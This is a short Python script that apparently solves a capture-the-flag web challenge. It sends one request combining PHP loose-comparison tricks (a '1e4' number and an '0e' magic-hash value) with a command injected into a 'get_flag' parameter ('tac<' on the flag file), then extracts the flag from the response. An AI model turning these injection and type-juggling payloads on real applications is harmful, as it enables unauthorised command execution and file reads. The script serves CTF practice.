from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print('python3 exp.py url')
    else:
        from requests import get

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }

        payload = "fl4g.php?num=1e4&md5=0e215962017&get_flag=tac<fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag"

        response = get(url=url + payload, headers=headers).text

        from re import findall

        flag = findall(r'flag{.*}', response)
        list_to_str = "".join(flag)
        print(list_to_str)
